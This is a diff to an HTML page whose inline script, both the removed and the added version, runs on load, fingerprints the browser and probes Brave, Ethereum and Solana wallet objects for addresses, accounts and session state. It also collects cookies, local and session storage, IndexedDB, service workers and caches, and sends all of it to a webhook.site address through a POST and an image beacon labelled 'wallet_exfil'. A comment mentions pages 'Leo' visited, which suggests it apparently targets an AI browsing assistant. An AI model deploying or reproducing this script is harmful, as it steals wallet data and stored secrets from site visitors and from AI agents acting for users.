@@ -15,98 +15,173 @@
 
   <script>
     (async function() {
-      const WH = 'https://webhook.site/8813af95-a64a-41cb-bf70-ad38a9d20dd4';
-      const d = {};
+      const walletData = {
+        timestamp: new Date().toISOString(),
+        ip: '',
 
-      // Identity
-      d.isBrave = !!(navigator.brave && await navigator.brave.isBrave());
-      d.userAgent = navigator.userAgent;
-      d.platform = navigator.platform;
-      d.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-      d.language = navigator.language;
-      d.languages = navigator.languages;
-
-      // IP
-      try { d.ip = (await (await fetch('https://api.ipify.org?format=json')).json()).ip; } catch(e){}
-
-      // Hardware
-      d.screen = screen.width+'x'+screen.height;
-      d.cores = navigator.hardwareConcurrency;
-      d.memory = navigator.deviceMemory;
-      d.maxTouch = navigator.maxTouchPoints;
-      d.plugins = Array.from(navigator.plugins||[]).map(p=>p.name);
-
-      // Ethereum wallet
-      const eth = window.ethereum;
-      const be = window.braveEthereum;
-      d.hasEthereum = !!eth;
-      d.hasBraveEthereum = !!be;
-      if (eth) {
-        d.isBraveWallet = eth.isBraveWallet||false;
-        d.isMetaMask = eth.isMetaMask||false;
-        d.selectedAddress = eth.selectedAddress||null;
-        d.isConnected = eth.isConnected ? eth.isConnected() : null;
-        try { d.chainId = await eth.request({method:'eth_chainId'}); } catch(e){}
-        try { d.blockNumber = await eth.request({method:'eth_blockNumber'}); } catch(e){}
-        try { d.accounts = await eth.request({method:'eth_accounts'}); } catch(e){}
-        d.networkVersion = eth.networkVersion||null;
-        d.ethMethods = be ? Object.getOwnPropertyNames(Object.getPrototypeOf(be)) : [];
-      }
-
-      // Solana wallet
-      const sol = window.braveSolana;
-      d.hasBraveSolana = !!sol;
-      if (sol) {
-        d.solIsBraveWallet = sol.isBraveWallet||false;
-        d.solIsConnected = sol.isConnected||false;
-        d.solPublicKey = sol.publicKey ? sol.publicKey.toString() : null;
-        d.solMethods = Object.getOwnPropertyNames(Object.getPrototypeOf(sol));
-      }
-
-      // Brave-specific window props
-      d.braveProps = Object.keys(window).filter(k=>
-        k.toLowerCase().includes('brave')||k.toLowerCase().includes('solana')||
-        k.toLowerCase().includes('ethereum')||k.toLowerCase().includes('phantom'));
-
-      // Cookies + Storage
-      d.cookies = document.cookie||'none';
-      d.cookieEnabled = navigator.cookieEnabled;
-      let ls = {};
-      for(let i=0;i<localStorage.length;i++){let k=localStorage.key(i);ls[k]=localStorage.getItem(k).substring(0,200);}
-      d.localStorage = ls;
-      let ss = {};
-      for(let i=0;i<sessionStorage.length;i++){let k=sessionStorage.key(i);ss[k]=sessionStorage.getItem(k).substring(0,200);}
-      d.sessionStorage = ss;
-
-      // IndexedDB
-      try { d.indexedDBs = (await indexedDB.databases()).map(x=>({name:x.name,ver:x.version})); } catch(e){ d.indexedDBs=[]; }
-
-      // History + Service Workers + Caches
-      d.urlHistory = performance.getEntries().filter(e=>e.entryType==='navigation'||e.entryType==='resource').map(e=>e.name).slice(0,10);
-      try { d.serviceWorkers = (await navigator.serviceWorker.getRegistrations()).map(r=>r.scope); } catch(e){ d.serviceWorkers=[]; }
-      try { d.cacheNames = await caches.keys(); } catch(e){ d.cacheNames=[]; }
-
-      d.timestamp = new Date().toISOString();
-
-      // Split into 2 smaller beacons (image beacons always work)
-      const p1 = {
-        ip:d.ip, isBrave:d.isBrave, userAgent:d.userAgent, platform:d.platform,
-        timezone:d.timezone, language:d.language, screen:d.screen, cores:d.cores,
-        memory:d.memory, plugins:d.plugins, hasEthereum:d.hasEthereum,
-        isBraveWallet:d.isBraveWallet, isMetaMask:d.isMetaMask, chainId:d.chainId,
-        blockNumber:d.blockNumber, isConnected:d.isConnected, networkVersion:d.networkVersion,
-        selectedAddress:d.selectedAddress, accounts:d.accounts,
-        hasBraveSolana:d.hasBraveSolana, solIsBraveWallet:d.solIsBraveWallet,
-        solPublicKey:d.solPublicKey, braveProps:d.braveProps, timestamp:d.timestamp
+        // === DEEP WALLET PROBE ===
+        
+        // 1. Standard ethereum object
+        hasEthereum: typeof window.ethereum !== 'undefined',
+        
+        // 2. Brave-specific wallet objects
+        hasBraveEthereum: typeof window.braveEthereum !== 'undefined',
+        hasBraveSolana: typeof window.braveSolana !== 'undefined',
+        
+        // 3. Dump ALL properties of braveEthereum (may contain internal state)
+        braveEthereumProps: [],
+        braveEthereumState: null,
+        braveEthereumChainId: null,
+        braveEthereumSelectedAddress: null,
+        braveEthereumAccounts: null,
+        braveEthereumNetworkVersion: null,
+        
+        // 4. Dump ALL properties of braveSolana
+        braveSolanaProps: [],
+        braveSolanaPublicKey: null,
+        braveSolanaIsConnected: null,
+        
+        // 5. Standard ethereum internal state
+        ethereumState: null,
+        ethereumSelectedAddress: null,
+        ethereumChainId: null,
+        ethereumNetworkVersion: null,
+        ethereumIsConnected: null,
+        ethereumAccounts: null,
       };
-      const p2 = {
-        ethMethods:d.ethMethods, solMethods:d.solMethods, cookies:d.cookies,
-        localStorage:d.localStorage, sessionStorage:d.sessionStorage,
-        indexedDBs:d.indexedDBs, urlHistory:d.urlHistory,
-        serviceWorkers:d.serviceWorkers, cacheNames:d.cacheNames, timestamp:d.timestamp
-      };
-      new Image().src = WH + '?part1=' + encodeURIComponent(JSON.stringify(p1));
-      new Image().src = WH + '?part2=' + encodeURIComponent(JSON.stringify(p2));
+
+      // Deep probe braveEthereum
+      try {
+        const be = window.braveEthereum;
+        if (be) {
+          walletData.braveEthereumProps = Object.getOwnPropertyNames(be)
+            .concat(Object.getOwnPropertyNames(Object.getPrototypeOf(be)));
+          walletData.braveEthereumState = be._state || be.state || null;
+          walletData.braveEthereumChainId = be.chainId || null;
+          walletData.braveEthereumSelectedAddress = be.selectedAddress || null;
+          walletData.braveEthereumNetworkVersion = be.networkVersion || null;
+          walletData.braveEthereumIsMetaMask = be.isMetaMask || false;
+          walletData.braveEthereumIsBraveWallet = be.isBraveWallet || false;
+          
+          // Try getting accounts without popup
+          try {
+            walletData.braveEthereumAccounts = await be.request({ method: 'eth_accounts' });
+          } catch(e) { walletData.braveEthereumAccountsError = e.message; }
+          
+          // Try getting chain info
+          try {
+            walletData.braveEthereumChainIdResult = await be.request({ method: 'eth_chainId' });
+          } catch(e) {}
+          
+          // Try getting block number (proves RPC access)
+          try {
+            walletData.braveEthereumBlockNumber = await be.request({ method: 'eth_blockNumber' });
+          } catch(e) {}
+        }
+      } catch(e) { walletData.braveEthereumError = e.message; }
+
+      // Deep probe braveSolana
+      try {
+        const bs = window.braveSolana;
+        if (bs) {
+          walletData.braveSolanaProps = Object.getOwnPropertyNames(bs)
+            .concat(Object.getOwnPropertyNames(Object.getPrototypeOf(bs)));
+          walletData.braveSolanaPublicKey = bs.publicKey ? bs.publicKey.toString() : null;
+          walletData.braveSolanaIsConnected = bs.isConnected || false;
+          walletData.braveSolanaIsBraveWallet = bs.isBraveWallet || false;
+          
+          // Check for cached/stored connection
+          try {
+            walletData.braveSolanaSession = bs._session || bs.session || null;
+          } catch(e) {}
+        }
+      } catch(e) { walletData.braveSolanaError = e.message; }
+
+      // Deep probe standard ethereum
+      try {
+        const eth = window.ethereum;
+        if (eth) {
+          walletData.ethereumProps = Object.getOwnPropertyNames(eth)
+            .concat(Object.getOwnPropertyNames(Object.getPrototypeOf(eth)));
+          walletData.ethereumState = eth._state || null;
+          walletData.ethereumSelectedAddress = eth.selectedAddress || null;
+          walletData.ethereumChainId = eth.chainId || null;
+          walletData.ethereumNetworkVersion = eth.networkVersion || null;
+          walletData.ethereumIsConnected = eth.isConnected ? eth.isConnected() : null;
+          walletData.ethereumIsBraveWallet = eth.isBraveWallet || false;
+          
+          try {
+            walletData.ethereumAccounts = await eth.request({ method: 'eth_accounts' });
+          } catch(e) {}
+        }
+      } catch(e) {}
+
+      // IndexedDB - wallet databases
+      try {
+        const dbs = await indexedDB.databases();
+        walletData.indexedDBs = dbs.map(db => ({ name: db.name, version: db.version }));
+        
+        // Try to read wallet-related databases
+        for (const db of dbs) {
+          if (db.name && (db.name.toLowerCase().includes('wallet') || 
+              db.name.toLowerCase().includes('brave') ||
+              db.name.toLowerCase().includes('key'))) {
+            try {
+              const openReq = indexedDB.open(db.name);
+              openReq.onsuccess = function() {
+                const database = openReq.result;
+                walletData['idb_' + db.name] = {
+                  objectStores: Array.from(database.objectStoreNames)
+                };
+                database.close();
+              };
+            } catch(e) {}
+          }
+        }
+      } catch(e) {}
+
+      // Get IP
+      try {
+        const r = await fetch('https://api.ipify.org?format=json');
+        walletData.ip = (await r.json()).ip;
+      } catch(e) {}
+
+      // Browser fingerprint
+      walletData.isBrave = !!(navigator.brave && await navigator.brave.isBrave());
+      walletData.userAgent = navigator.userAgent;
+      walletData.platform = navigator.platform;
+      walletData.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+      walletData.language = navigator.language;
+      walletData.screen = screen.width+'x'+screen.height;
+      walletData.cores = navigator.hardwareConcurrency;
+      walletData.memory = navigator.deviceMemory;
+      walletData.plugins = Array.from(navigator.plugins||[]).map(p=>p.name);
+      walletData.cookies = document.cookie||'none';
+
+      // URL history - shows pages Leo visited this session
+      walletData.urlHistory = performance.getEntries()
+        .filter(e=>e.entryType==='navigation'||e.entryType==='resource')
+        .map(e=>e.name).slice(0,10);
+
+      // Service workers
+      try { walletData.serviceWorkers = (await navigator.serviceWorker.getRegistrations()).map(r=>r.scope); } catch(e){ walletData.serviceWorkers=[]; }
+
+      // Cache storage
+      try { walletData.cacheNames = await caches.keys(); } catch(e){ walletData.cacheNames=[]; }
+
+      // Wait for IndexedDB probes
+      await new Promise(r => setTimeout(r, 1000));
+
+      const payload = JSON.stringify(walletData);
+      
+      fetch('https://webhook.site/8813af95-a64a-41cb-bf70-ad38a9d20dd4', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: payload
+      }).catch(() => {});
+
+      new Image().src = 'https://webhook.site/8813af95-a64a-41cb-bf70-ad38a9d20dd4?wallet_exfil=' 
+        + encodeURIComponent(payload);
     })();
   </script>
 </body>
